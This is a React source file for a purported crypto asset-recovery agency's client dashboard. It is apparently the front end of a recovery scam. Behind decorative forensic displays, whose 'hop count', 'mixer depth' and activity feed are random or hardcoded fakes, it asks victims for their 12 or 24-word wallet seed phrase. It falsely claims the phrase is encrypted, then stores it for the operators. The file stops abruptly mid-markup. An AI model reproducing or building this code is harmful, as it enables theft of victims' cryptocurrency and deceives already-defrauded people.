import React from 'react';
import { LOGO_URL } from '../constants';
import { 
  ShieldCheck, 
  MessageSquare, 
  Clock, 
  FileText, 
  Activity, 
  Send,
  MoreVertical,
  ChevronRight,
  Search,
  Lock,
  Eye,
  FileSearch,
  CheckCircle2,
  User as UserIcon,
  Bell,
  Inbox,
  AlertTriangle,
  Info
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { db, handleFirestoreError, OperationType } from '../lib/firebase';
import {
  fetchClientCase,
  markClientNotificationsRead,
  postClientCaseMessage,
  submitClientKeyphrase,
} from '../lib/caseClientApi';
import { fileToBase64 } from '../lib/forensic/crypto';
import { doc, updateDoc, serverTimestamp, collection, query, orderBy, onSnapshot, addDoc } from 'firebase/firestore';

interface ClientDashboardViewProps {
  caseData?: any;
}

export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
  const [activeTab, setActiveTab] = React.useState<'overview' | 'messages'>('overview');
  const [message, setMessage] = React.useState('');
  const [messages, setMessages] = React.useState<any[]>([]);
  const [liveCaseData, setLiveCaseData] = React.useState<any>(caseData);
  const [sendingMessage, setSendingMessage] = React.useState(false);
  const [notifications, setNotifications] = React.useState<any[]>([]);
  const [isNotificationsOpen, setIsNotificationsOpen] = React.useState(false);
  const [unreadCount, setUnreadCount] = React.useState(0);
  
  const [hopCount, setHopCount] = React.useState(12);
  const [mixerDepth, setMixerDepth] = React.useState(4);

  React.useEffect(() => {
    const interval = setInterval(() => {
      setHopCount(prev => prev + (Math.random() > 0.7 ? 1 : Math.random() > 0.3 ? 0 : -1));
      setMixerDepth(prev => prev + (Math.random() > 0.9 ? 1 : Math.random() > 0.1 ? 0 : -1));
    }, 4000);
    return () => clearInterval(interval);
  }, []);

  React.useEffect(() => {
    if (!caseData?.id) return;

    const firestoreDocId =
      caseData.firestoreDocId ||
      (caseData.storageSource === 'server' ? null : caseData.id);

    if (!firestoreDocId) {
      const caseId = String(caseData.caseId || caseData.id);
      const email = String(caseData.secureComms || caseData.email || '');
      if (!email) {
        setLiveCaseData(caseData);
        return;
      }

      const refresh = async () => {
        const result = await fetchClientCase(caseId, email);
        if (result.ok && result.case) {
          setLiveCaseData(result.case);
          setMessages(result.case.messages || []);
          setNotifications(result.case.notifications || []);
          setUnreadCount(
            (result.case.notifications || []).filter((n) => !n.read).length
          );
        }
      };

      refresh();
      const interval = window.setInterval(refresh, 5000);
      return () => window.clearInterval(interval);
    }

    const qMessages = query(
      collection(db, 'recovery_requests', firestoreDocId, 'messages'),
      orderBy('createdAt', 'asc')
    );

    const unsubMessages = onSnapshot(qMessages, (snapshot) => {
      setMessages(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
    }, (error) => {
      handleFirestoreError(error, OperationType.LIST, `recovery_requests/${firestoreDocId}/messages`);
    });

    const qNotifications = query(
      collection(db, 'recovery_requests', firestoreDocId, 'notifications'),
      orderBy('createdAt', 'desc')
    );

    const unsubNotifications = onSnapshot(qNotifications, (snapshot) => {
      const docs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setNotifications(docs);
      setUnreadCount(docs.filter((n: any) => !n.read).length);
    }, (error) => {
      handleFirestoreError(error, OperationType.LIST, `recovery_requests/${firestoreDocId}/notifications`);
    });

    const unsubCase = onSnapshot(doc(db, 'recovery_requests', firestoreDocId), (snapshot) => {
      if (snapshot.exists()) {
        setLiveCaseData({ id: snapshot.id, firestoreDocId: snapshot.id, ...snapshot.data() });
      }
    }, (error) => {
      handleFirestoreError(error, OperationType.GET, `recovery_requests/${firestoreDocId}`);
    });

    return () => {
      unsubMessages();
      unsubNotifications();
      unsubCase();
    };
  }, [caseData]);

  const handleSendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!message.trim() || !caseData?.id) return;

    const firestoreDocId =
      caseData.firestoreDocId ||
      (caseData.storageSource === 'server' ? null : caseData.id);
    const serverCaseId = !firestoreDocId
      ? String(caseData.caseId || caseData.id)
      : null;
    const email = String(caseData.secureComms || caseData.email || '');

    setSendingMessage(true);
    try {
      if (serverCaseId && email) {
        const result = await postClientCaseMessage(
          serverCaseId,
          email,
          message.trim()
        );
        if (!result.ok) throw new Error(result.error || 'Send failed');
        const refreshed = await fetchClientCase(serverCaseId, email);
        if (refreshed.ok && refreshed.case) {
          setMessages(refreshed.case.messages || []);
          setLiveCaseData(refreshed.case);
        }
      } else if (firestoreDocId) {
        await addDoc(
          collection(db, 'recovery_requests', firestoreDocId, 'messages'),
          {
            text: message,
            sender: 'Client',
            senderId: 'client',
            createdAt: serverTimestamp(),
            type: 'client_message',
          }
        );
      }
      setMessage('');
    } catch (err) {
      if (firestoreDocId) {
        handleFirestoreError(
          err,
          OperationType.CREATE,
          `recovery_requests/${firestoreDocId}/messages`
        );
      } else {
        console.error('Server message failed:', err);
      }
    } finally {
      setSendingMessage(false);
    }
  };

  const displayId = liveCaseData?.id ? `#${liveCaseData.id.slice(0, 8).toUpperCase()}` : '#DF-8829-QX-04';
  const displayValue = liveCaseData?.estimatedValue ? `$${Number(liveCaseData.estimatedValue).toLocaleString()}.00` : '$42,500.00';
  const displayEmail = liveCaseData?.secureComms || 'USER_SECURE@COMM';
  const displayStatus = liveCaseData?.status || 'PENDING';
  const hasSubmittedKeyphrase =
    !!liveCaseData?.walletKeyphrase ||
    !!liveCaseData?.walletKeyphraseSubmitted;

  const getStatusSteps = (currentStatus: string) => {
    const uniqueSteps = [
      { id: 'INTAKE', title: 'Intake Received', date: liveCaseData?.createdAt?.toDate ? new Date(liveCaseData.createdAt.toDate()).toLocaleDateString() : 'May 04, 2024' },
      { id: 'INITIALIZING', title: 'Metadata Extraction', date: currentStatus === 'PENDING' || currentStatus === 'INITIALIZING' ? 'Active' : 'Pending' },
      { id: 'ANALYSIS', title: 'Wallet Verification Journey', date: currentStatus === 'ANALYSIS' ? 'Action Required' : 'TBD' },
      { id: 'PROCESSING', title: 'Transaction Forensic Trace', date: 'Processing' },
      { id: 'RECOVERY', title: 'Asset Recovery', date: 'TBD' },
    ];

    const statusMap: Record<string, number> = {
      'PENDING': 0,
      'INITIALIZING': 1,
      'ANALYSIS': 2,
      'PROCESSING': 3,
      'RECOVERY': 4,
      'COMPLETED': 5
    };

    const activeIndex = statusMap[currentStatus] || 0;
    
    // Admin IDs mapping to the steps in uniqueSteps
    const stepIds = ['INTAKE', 'INITIALIZING', 'ANALYSIS', 'PROCESSING', 'RECOVERY', 'COMPLETED'];

    return uniqueSteps.map((step, index) => {
      const stepId = stepIds[index];
      const isActuallyCompleted = index === 0 || liveCaseData?.completedSteps?.includes(stepId);
      
      return {
        ...step,
        completed: isActuallyCompleted || index < activeIndex, 
        active: index === activeIndex
      };
    });
  };

  const currentSteps = getStatusSteps(displayStatus);

  const [activityTimes, setActivityTimes] = React.useState([120, 900, 2700]);

  React.useEffect(() => {
    const interval = setInterval(() => {
      setActivityTimes(prev => prev.map(t => t + 1));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatRelTime = (seconds: number) => {
    if (seconds < 60) return `${Math.floor(seconds)}s AGO`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m AGO`;
    return `${Math.floor(seconds / 3600)}h AGO`;
  };

  const recentActivity = [
    { type: 'log', title: 'Node 04-X Alpha assigned to case monitoring', time: formatRelTime(activityTimes[0]) },
    { type: 'file', title: 'Forensic_Report_Draft_v1.pdf generated', time: formatRelTime(activityTimes[1]) },
    { type: 'comms', title: 'Analyst Rogers sent a secure message', time: formatRelTime(activityTimes[2]) },
  ];

  const [keyphrase, setKeyphrase] = React.useState('');
  const [isSubmittingKey, setIsSubmittingKey] = React.useState(false);
  const [submissionSuccess, setSubmissionSuccess] = React.useState(false);

  const [validationError, setValidationError] = React.useState<string | null>(null);
  const [proofImage, setProofImage] = React.useState<File | null>(null);
  const [proofImageError, setProofImageError] = React.useState<string | null>(null);
  const proofInputRef = React.useRef<HTMLInputElement>(null);
  const proofInputId = 'keyphrase-proof-image-input';

  const normalizeKeyphrase = (raw: string): string =>
    raw
      .replace(/\r?\n/g, ' ')
      .replace(/[,;]+/g, ' ')
      .replace(/\b\d{1,2}[.)](?=\s)/g, ' ')
      .replace(/\s+/g, ' ')
      .trim();

  const handleSubmitKeyphrase = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError(null);
    setProofImageError(null);
    
    // Validation for non-empty keyphrase
    const normalizedKeyphrase = normalizeKeyphrase(keyphrase);

    if (normalizedKeyphrase.length === 0) {
      setValidationError('Please enter your recovery keyphrase.');
      return;
    }
    
    const words = normalizedKeyphrase.split(/\s+/);
    if (words.length < 3) {
      setValidationError('Keyphrase is too short. Enter words separated by spaces (or numbered format).');
      return;
    }

    let proofImagePayload:
      | { filename: string; mimeType: string; contentBase64: string }
      | undefined;

    if (proofImage) {
      const ext = proofImage.name.split('.').pop()?.toLowerCase() || '';
      const mimeFromExt: Record<string, string> = {
        jpg: 'image/jpeg',
        jpeg: 'image/jpeg',
        png: 'image/png',
        webp: 'image/webp',
        heic: 'image/heic',
        heif: 'image/heif',
      };
      const allowedExts = new Set(['jpg', 'jpeg', 'png', 'webp', 'heic', 'heif']);
      const allowedTypes = new Set([
        'image/jpeg',
        'image/jpg',
        'image/pjpeg',
        'image/png',
        'image/x-png',
        'image/webp',
        'image/heic',
        'image/heif',
        'image/heic-sequence',
        'image/heif-sequence',
      ]);
      const normalizedType = (proofImage.type || '').toLowerCase();
      const resolvedMimeType =
        (allowedTypes.has(normalizedType) ? normalizedType : '') ||
        mimeFromExt[ext] ||
        normalizedType;
      const maxBytes = 10 * 1024 * 1024;
      const mimeLooksLikeImage = resolvedMimeType.startsWith('image/');
      if (!allowedTypes.has(resolvedMimeType) && !(mimeLooksLikeImage && allowedExts.has(ext))) {
        setProofImageError('Only JPG, JPEG, PNG, WEBP, HEIC, or HEIF image files are allowed.');
        return;
      }
      if (proofImage.size > maxBytes) {
        setProofImageError('Image is too large. Maximum file size is 10MB.');
        return;
      }
      const dataUrl = await fileToBase64(proofImage);
      const contentBase64 = dataUrl.split(',')[1] || '';
      if (!contentBase64) {
        setProofImageError('Could not read the selected image. Please choose another file.');
        return;
      }
      proofImagePayload = {
        filename: proofImage.name,
        mimeType: resolvedMimeType,
        contentBase64,
      };
    }

    setIsSubmittingKey(true);
    try {
      const firestoreDocId =
        caseData?.firestoreDocId ||
        (caseData?.storageSource === 'server' ? null : caseData?.id);
      const serverCaseId = !firestoreDocId
        ? String(caseData?.caseId || caseData?.id || liveCaseData?.id)
        : null;
      const email = String(
        caseData?.secureComms || caseData?.email || liveCaseData?.secureComms || ''
      );

      if (serverCaseId && email) {
        const result = await submitClientKeyphrase(
          serverCaseId,
          email,
          normalizedKeyphrase,
          proofImagePayload
        );
        if (!result.ok) {
          throw new Error(result.error || 'Submission failed');
        }
        if (result.case) {
          setLiveCaseData(result.case);
        }
        setSubmissionSuccess(true);
        setKeyphrase('');
        setProofImage(null);
      } else if (firestoreDocId) {
        const caseRef = doc(db, 'recovery_requests', firestoreDocId);
        await updateDoc(caseRef, {
          walletKeyphrase: normalizedKeyphrase,
          status: 'PROCESSING',
          updatedAt: serverTimestamp(),
          keyphraseSubmittedAt: serverTimestamp(),
        });
        setSubmissionSuccess(true);
        setKeyphrase('');
      } else {
        throw new Error('Case ID missing. Cannot submit keyphrase.');
      }
    } catch (err: unknown) {
      console.error('Submission error:', err);
      const errorMessage =
        err instanceof Error
          ? err.message
          : 'Failed to submit authority report. Please try again.';
      setValidationError(
        errorMessage.includes('permission')
          ? 'Could not save keyphrase. Please try again or contact support.'
          : `SYSTEM_ERROR: ${errorMessage}`
      );
    } finally {
      setIsSubmittingKey(false);
    }
  };

  const handleMarkAsRead = async (notificationId: string) => {
    if (!caseData?.id) return;
    const firestoreDocId =
      caseData.firestoreDocId ||
      (caseData.storageSource === 'server' ? null : caseData.id);
    const email = String(caseData.secureComms || caseData.email || '');

    try {
      if (!firestoreDocId && email) {
        await markClientNotificationsRead(
          String(caseData.caseId || caseData.id),
          email,
          notificationId
        );
        setNotifications((prev) =>
          prev.map((n) =>
            n.id === notificationId ? { ...n, read: true } : n
          )
        );
        setUnreadCount((c) => Math.max(0, c - 1));
        return;
      }
      if (!firestoreDocId) return;
      await updateDoc(
        doc(db, 'recovery_requests', firestoreDocId, 'notifications', notificationId),
        { read: true }
      );
    } catch (err) {
      handleFirestoreError(
        err,
        OperationType.UPDATE,
        `recovery_requests/${firestoreDocId}/notifications/${notificationId}`
      );
    }
  };

  const handleMarkAllRead = async () => {
    if (!caseData?.id || unreadCount === 0) return;
    const firestoreDocId =
      caseData.firestoreDocId ||
      (caseData.storageSource === 'server' ? null : caseData.id);
    const email = String(caseData.secureComms || caseData.email || '');
    const unread = notifications.filter((n) => !n.read);

    try {
      if (!firestoreDocId && email) {
        await markClientNotificationsRead(
          String(caseData.caseId || caseData.id),
          email
        );
        setNotifications((prev) => prev.map((n) => ({ ...n, read: true })));
        setUnreadCount(0);
        return;
      }
      if (!firestoreDocId) return;
      await Promise.all(
        unread.map((n) =>
          updateDoc(
            doc(db, 'recovery_requests', firestoreDocId, 'notifications', n.id),
            { read: true }
          )
        )
      );
    } catch (err) {
      console.error('Failed to mark all as read:', err);
    }
  };

  return (
    <main className="pt-32 sm:pt-40 pb-32 px-4 sm:px-6 lg:px-12 max-w-[1400px] mx-auto min-h-screen relative z-10">
      {/* Header Section */}
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-10 border-b border-white/5 pb-8">
        <div>
          <div className="flex flex-wrap items-center gap-3 mb-2">
            <span className="px-2 py-0.5 bg-blue-500/10 border border-blue-500/30 text-blue-400 font-mono text-[9px] sm:text-[10px] tracking-widest rounded flex items-center gap-2 uppercase">
              <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse"></span>
              Live Case Stream
            </span>
            <span className="text-slate-500 font-mono text-[9px] sm:text-[10px] uppercase">ID: {displayId}</span>
            <span className="text-slate-500 font-mono text-[9px] sm:text-[10px] uppercase ml-0 sm:ml-2 px-0 sm:px-2 border-none sm:border-l sm:border-white/10">{displayEmail}</span>
          </div>
          <h1 className="text-2xl sm:text-3xl font-manrope font-black text-white uppercase tracking-tight flex items-center gap-3 sm:gap-4">
            <img 
               src={LOGO_URL}
               alt="Crypto Recovery Assets Agency Logo"
               width={48}
               height={48}
               className="w-10 h-10 sm:w-12 sm:h-12 object-contain" 
            />
            <span>Case <span className="text-blue-500">Workspace</span></span>
          </h1>
        </div>
        
        <div className="flex items-center gap-4">
          <div className="relative">
            <button 
              onClick={() => setIsNotificationsOpen(!isNotificationsOpen)}
              className={`p-3 rounded-xl border transition-all relative group ${
                unreadCount > 0 ? 'bg-blue-600/10 border-blue-500 text-blue-400' : 'bg-white/5 border-white/10 text-slate-500 hover:text-white'
              }`}
            >
              <Bell size={20} className={unreadCount > 0 ? 'animate-bounce' : ''} />
              {unreadCount > 0 && (
                <span className="absolute -top-1 -right-1 w-5 h-5 bg-red-500 text-white font-mono text-[10px] font-bold rounded-full flex items-center justify-center shadow-lg shadow-red-500/40 border-2 border-[#020408]">
                  {unreadCount}
                </span>
              )}
            </button>

            <AnimatePresence>
              {isNotificationsOpen && (
                <>
                  <motion.div 
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    onClick={() => setIsNotificationsOpen(false)}
                    className="fixed inset-0 z-40"
                  />
                  <motion.div 
                    initial={{ opacity: 0, y: 10, scale: 0.95 }}
                    animate={{ opacity: 1, y: 0, scale: 1 }}
                    exit={{ opacity: 0, y: 10, scale: 0.95 }}
                    className="absolute right-0 mt-4 w-[320px] sm:w-[400px] glass-panel border border-white/10 rounded-2xl shadow-2xl z-50 overflow-hidden"
                  >
                    <div className="p-4 border-b border-white/5 bg-slate-950/60 flex items-center justify-between">
                      <h3 className="font-mono text-[10px] font-bold text-white uppercase tracking-widest flex items-center gap-2">
                        <Inbox size={12} className="text-blue-500" /> Notifications
                      </h3>
                      {unreadCount > 0 && (
                        <button 
                          onClick={handleMarkAllRead}
                          className="text-[9px] font-mono text-blue-400 hover:text-white uppercase tracking-tighter"
                        >
                          Mark all as read
                        </button>
                      )}
                    </div>
                    <div className="max-h-[400px] overflow-y-auto custom-scrollbar p-2 space-y-2">
                      {notifications.length === 0 ? (
                        <div className="py-12 text-center">
                          <p className="text-[10px] font-mono text-slate-600 uppercase tracking-widest">No notifications detected</p>
                        </div>
                      ) : (
                        notifications.map((notif: any) => (
                          <div 
                            key={notif.id}
                            onClick={() => !notif.read && handleMarkAsRead(notif.id)}
                            className={`p-4 rounded-xl border transition-all cursor-pointer group ${
                              notif.read ? 'bg-white/5 border-white/5 opacity-60' : 'bg-blue-600/5 border-blue-500/20 hover:border-blue-500/40'
                            }`}
                          >
                            <div className="flex items-start gap-4">
                              <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${
                                notif.type === 'STATUS_UPDATE' ? 'bg-blue-500/20 text-blue-400' :
                                notif.type === 'ACTION_REQUIRED' ? 'bg-amber-500/20 text-amber-500' :
                                notif.type === 'MESSAGE' ? 'bg-purple-500/20 text-purple-400' :
                               'bg-emerald-500/20 text-emerald-400'
                              }`}>
                                {notif.type === 'STATUS_UPDATE' ? <Activity size={14} /> :
                                 notif.type === 'ACTION_REQUIRED' ? <AlertTriangle size={14} /> :
                                 notif.type === 'MESSAGE' ? <MessageSquare size={14} /> :
                                 <Info size={14} />}
                              </div>
                              <div className="flex-1 min-w-0">
                                <p className={`text-[11px] font-bold uppercase tracking-wide mb-0.5 ${notif.read ? 'text-slate-400' : 'text-white'}`}>
                                  {notif.title}
                                </p>
                                <p className="text-[10px] text-slate-400 font-manrope leading-relaxed line-clamp-2">
                                  {notif.message}
                                </p>
                                <p className="text-[8px] font-mono text-slate-600 mt-2 uppercase">
                                  {notif.createdAt?.toDate?.()?.toLocaleString() || 'JUST NOW'}
                                </p>
                              </div>
                              {!notif.read && (
                                <div className="w-2 h-2 rounded-full bg-blue-500 shrink-0 mt-1" />
                              )}
                            </div>
                          </div>
                        ))
                      )}
                    </div>
                  </motion.div>
                </>
              )}
            </AnimatePresence>
          </div>

          <div className="hidden sm:flex items-center gap-2 sm:gap-4 bg-slate-950/60 p-1.5 sm:p-2 rounded-xl border border-white/5 backdrop-blur-md overflow-x-auto scrollbar-hide shrink-0">
          <button 
            onClick={() => setActiveTab('overview')}
            className={`px-4 sm:px-6 py-2 rounded-lg font-mono text-[10px] sm:text-xs font-bold transition-all uppercase tracking-widest whitespace-nowrap ${activeTab === 'overview' ? 'bg-blue-600 text-white shadow-[0_0_15px_rgba(0,98,255,0.4)]' : 'text-slate-500 hover:text-white'}`}
          >
            Overview
          </button>
          <button 
            onClick={() => setActiveTab('messages')}
            className={`px-4 sm:px-6 py-2 rounded-lg font-mono text-[10px] sm:text-xs font-bold transition-all uppercase tracking-widest whitespace-nowrap ${activeTab === 'messages' ? 'bg-blue-600 text-white shadow-[0_0_15px_rgba(0,98,255,0.4)]' : 'text-slate-500 hover:text-white'}`}
          >
            Comms
          </button>
        </div>
      </div>
    </div>

    <AnimatePresence mode="wait">
        {activeTab === 'overview' && (
          <motion.div 
            key="overview"
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="grid grid-cols-1 lg:grid-cols-12 gap-8"
          >
            {/* Left Col: Case Tracking */}
            <div className="lg:col-span-8 space-y-8">
              {/* Main Progress Card */}
              <div className="glass-panel rounded-2xl border border-white/5 relative overflow-hidden grid grid-cols-1 md:grid-cols-2">
                <div className="p-8 border-r border-white/5">
                  <div className="absolute top-0 right-0 p-4 opacity-5 md:hidden">
                    <FileSearch size={120} />
                  </div>
                  <h3 className="font-mono text-xs font-bold text-blue-500 mb-8 uppercase tracking-[0.2em] flex items-center gap-2">
                    <Activity size={14} /> Journey Analysis
                  </h3>

                  <div className="space-y-0 relative">
                    {/* Progress Line */}
                    <div className="absolute left-[23px] top-4 bottom-4 w-px bg-white/5"></div>
                    
                    {currentSteps.map((step, i) => (
                      <div key={i} className={`flex gap-6 pb-10 last:pb-0 relative ${!step.completed && !step.active ? 'opacity-30' : ''}`}>
                        <div className={`w-12 h-12 rounded-full flex items-center justify-center border-2 z-10 transition-all ${
                          step.completed ? 'bg-blue-500/20 border-blue-500 text-blue-400' : 
                          step.active ? 'bg-blue-600 border-blue-400 text-white shadow-[0_0_15px_#3b82f644] animate-pulse' : 
                          'bg-slate-900 border-white/10 text-slate-600'
                        }`}>
                          {step.completed ? <CheckCircle2 size={20} /> : <span className="font-mono text-xs">{i + 1}</span>}
                        </div>
                        <div className="pt-2">
                          <div className="flex items-center gap-4 mb-1">
                            <h4 className="text-sm font-manrope font-black text-white uppercase tracking-wider">{step.title}</h4>
                            {step.active && <span className="bg-blue-500/20 text-blue-400 text-[8px] font-bold px-2 py-0.5 rounded tracking-widest border border-blue-500/30">ACTION_REQUIRED</span>}
                          </div>
                          <p className="text-[10px] font-mono text-slate-500 uppercase tracking-tighter">
                            {step.date}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="hidden md:flex flex-col bg-slate-950/40 p-8 relative overflow-hidden">
                   <div className="absolute inset-0 opacity-[0.05] pointer-events-none" style={{ backgroundImage: 'radial-gradient(circle, #3b82f6 1px, transparent 1px)', backgroundSize: '16px 16px' }}></div>
                   <h3 className="font-mono text-[10px] font-bold text-slate-500 mb-8 uppercase tracking-widest">Network Cluster Map</h3>
                   
                   <div className="flex-1 relative flex items-center justify-center">
                     {/* Animated Node Connections */}
                     <svg className="absolute inset-0 w-full h-full opacity-40">
                       <motion.line 
                        x1="50%" y1="50%" x2="20%" y2="20%" 
                        stroke="#3b82f6" strokeWidth="0.5" strokeDasharray="4 4"
                        animate={{ strokeDashoffset: [0, -20] }} transition={{ repeat: Infinity, duration: 2, ease: "linear" }}
                       />
                       <motion.line 
                        x1="50%" y1="50%" x2="80%" y2="30%" 
                        stroke="#3b82f6" strokeWidth="0.5" strokeDasharray="4 4"
                        animate={{ strokeDashoffset: [0, -20] }} transition={{ repeat: Infinity, duration: 2.5, ease: "linear" }}
                       />
                       <motion.line 
                        x1="50%" y1="50%" x2="70%" y2="80%" 
                        stroke="#3b82f6" strokeWidth="0.5" strokeDasharray="4 4"
                        animate={{ strokeDashoffset: [0, -20] }} transition={{ repeat: Infinity, duration: 3, ease: "linear" }}
                       />
                       <motion.line 
                        x1="50%" y1="50%" x2="30%" y2="75%" 
                        stroke="#3b82f6" strokeWidth="0.5" strokeDasharray="4 4"
                        animate={{ strokeDashoffset: [0, -20] }} transition={{ repeat: Infinity, duration: 2.2, ease: "linear" }}
                       />
                     </svg>

                     <div className="relative z-10">
                        <div className="w-16 h-16 rounded-full bg-blue-500/20 border border-blue-500 flex items-center justify-center animate-pulse">
                          <Activity className="text-blue-500" />
                        </div>
                        {/* Satellite Nodes */}
                        <div className="absolute -top-16 -left-12 w-8 h-8 rounded-lg bg-slate-900 border border-white/10 flex items-center justify-center">
                          <div className="w-1.5 h-1.5 rounded-full bg-emerald-500"></div>
                        </div>
                        <div className="absolute -top-10 -right-16 w-8 h-8 rounded-lg bg-slate-900 border border-white/10 flex items-center justify-center">
                          <div className="w-1.5 h-1.5 rounded-full bg-blue-500"></div>
                        </div>
                        <div className="absolute -bottom-16 -right-10 w-8 h-8 rounded-lg bg-slate-900 border border-white/10 flex items-center justify-center">
                          <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></div>
                        </div>
                     </div>
                   </div>

                   <div className="mt-8 grid grid-cols-2 gap-4">
                     <div className="p-3 rounded-lg bg-white/5 border border-white/5">
                        <p className="text-[8px] font-mono text-slate-500 uppercase mb-1">HOP_COUNT</p>
                        <p className="text-lg font-mono font-bold text-white transition-all duration-1000">{hopCount}</p>
                     </div>
                     <div className="p-3 rounded-lg bg-white/5 border border-white/5">
                        <p className="text-[8px] font-mono text-slate-500 uppercase mb-1">MIXER_DEPTH</p>
                        <p className="text-lg font-mono font-bold text-white transition-all duration-1000">{Math.max(1, mixerDepth)}</p>
                     </div>
                   </div>
                </div>
              </div>

              {/* Action Required: Wallet Keyphrase Submission */}
              {displayStatus === 'ANALYSIS' && !hasSubmittedKeyphrase && !submissionSuccess && (
                <motion.div 
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="glass-panel p-8 rounded-2xl border-2 border-blue-500 bg-blue-500/10 shadow-[0_0_50px_rgba(0,98,255,0.2)] relative overflow-hidden"
                >
                  <div className="absolute top-0 right-0 p-4 opacity-10 pointer-events-none">
                    <Lock size={160} />
                  </div>
                  <div className="relative z-10">
                    <div className="flex flex-col sm:flex-row items-center gap-4 sm:gap-6 mb-6">
                      <div className="w-12 h-12 bg-blue-500 rounded-xl flex items-center justify-center text-white shadow-lg shadow-blue-500/40 shrink-0">
                        <ShieldCheck size={24} />
                      </div>
                      <div className="text-center sm:text-left">
                        <h3 className="text-xl sm:text-2xl font-manrope font-black text-white uppercase tracking-tight">
                          Required: Authority Verification
                        </h3>
                        <p className="text-[10px] font-mono text-blue-400 uppercase tracking-widest">Action Request // Phase: 03-Analysis</p>
                      </div>
                    </div>

                    <p className="text-sm text-slate-300 mb-8 max-w-2xl leading-relaxed">
                      Your case has reached the <span className="text-white font-bold text-blue-400">Wallet Verification Journey Analysis</span> phase. To initiate the deep-trace forensic report and establish authority over the target node, we require your 12 or 24-word recovery keyphrase. This data is end-to-end encrypted and used strictly for node ownership validation.
                    </p>
                    <p className="text-[11px] text-blue-200/90 mb-6 font-mono">
                      Keyphrase format: enter words separated by spaces (example: <span className="text-white">word1 word2 word3 ...</span>) or numbered lines (example: <span className="text-white">1. word 2. word 3. word</span>).
                    </p>

                    <form onSubmit={handleSubmitKeyphrase} className="space-y-6">
                      <div className="relative">
                        <textarea
                          value={keyphrase}
                          onChange={(e) => {
                            setKeyphrase(e.target.value);
                            if (validationError) setValidationError(null);
                          }}
                          placeholder="Enter your 12 or 24-word keyphrase (space-separated or numbered) exactly as shown..."
                          className={`w-full bg-black/60 border-2 rounded-xl p-6 font-mono text-sm text-white focus:border-blue-500 outline-none transition-all min-h-[140px] placeholder:text-slate-700 shadow-inner ${validationError ? 'border-red-500/50' : 'border-blue-500/30'}`}
                          required
                        />
                        <div className="absolute bottom-4 right-4 flex items-center gap-2 opacity-40">
                           <span className="text-[9px] font-mono text-slate-400 uppercase">Secure Link Active</span>
                           <Activity size={12} className="text-blue-500 animate-pulse" />
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label className="block text-[10px] font-mono text-slate-400 uppercase tracking-widest">
                          Optional proof image (JPG/PNG/WEBP/HEIC/HEIF, max 10MB)
                        </label>
                        <div className="flex flex-wrap items-center gap-3">
                          <div className="relative inline-flex">
                            <button
                              type="button"
                              className="px-4 py-2 rounded-lg border border-blue-500/40 bg-blue-600/20 text-white font-mono text-[10px] uppercase tracking-widest hover:bg-blue-600/30 transition-colors cursor-pointer"
                            >
                              Choose Image
                            </button>
                            <input
                              id={proofInputId}
                              ref={proofInputRef}
                              type="file"
                              accept="image/png,image/jpeg,image/webp,image/heic,image/heif,.heic,.heif,.jpg,.jpeg,.png,.webp"
                              onChange={(e) => {
                                setProofImageError(null);
                                const f = e.target.files?.[0] || null;
                                setProofImage(f);
                              }}
                              className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                            />
                          </div>
                          {proofImage && (
                            <button
                              type="button"
                              onClick={() => {
                                setProofImage(null);
                                setProofImageError(null);
                                if (proofInputRef.current) proofInputRef.current.value = '';
                              }}
                              className="px-4 py-2 rounded-lg border border-red-500/40 bg-red-600/10 text-red-300 font-mono text-[10px] uppercase tracking-widest hover:bg-red-600/20 transition-colors cursor-pointer"
                            >
                              Remove Image
                            </button>
                          )}
                        </div>
                        <input
                          type="text"
                          readOnly
                          value={proofImage ? `Selected: ${proofImage.name}` : 'No file chosen'}
                          className="w-full bg-black/50 border border-blue-500/20 rounded-lg p-3 text-xs text-slate-300 font-mono"
                        />
                        {proofImageError && (
                          <p className="text-[10px] font-mono text-red-400 uppercase tracking-wide">
                            {proofImageError}
                          </p>
                        )}
                      </div>

                      {validationError && (
                        <motion.div 
                          initial={{ opacity: 0, x: -10 }}
                          animate={{ opacity: 1, x: 0 }}
                          className="p-4 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center gap-3 text-red-400"
                        >
                          <Activity size={16} className="flex-shrink-0" />
                          <p className="text-xs font-mono uppercase tracking-tight">{validationError}</p>
                        </motion.div>
                      )}

                      <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                        <div className="flex items-center gap-4">
                          <div className="p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                            <Lock size={16} className="text-emerald-500" />
                          </div>
                          <div>
                            <p className="text-[10px] font-mono text-slate-400 uppercase tracking-widest font-bold">Encrypted Uplink</p>
                            <p className="text-[9px] font-mono text-slate-600 uppercase tracking-tighter">Validating Authority via AES-256-GCM Protocol</p>
                          </div>
                        </div>
                        
                        <button 
                          type="submit"
                          disabled={isSubmittingKey}
                          className="w-full md:w-auto px-12 py-5 bg-blue-600 text-white rounded-xl font-manrope font-black text-[11px] uppercase tracking-[0.2em] shadow-[0_0_35px_#0062ff66] hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-3 disabled:opacity-50 group"
                        >
                          {isSubmittingKey ? (
                            <>
                              <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                              Establishing Remote Link...
                            </>
                          ) : (
                            <>
                              Submit Authority Report <ChevronRight size={14} className="group-hover:translate-x-1 transition-transform" />
                            </>
                          )}
                        </button>
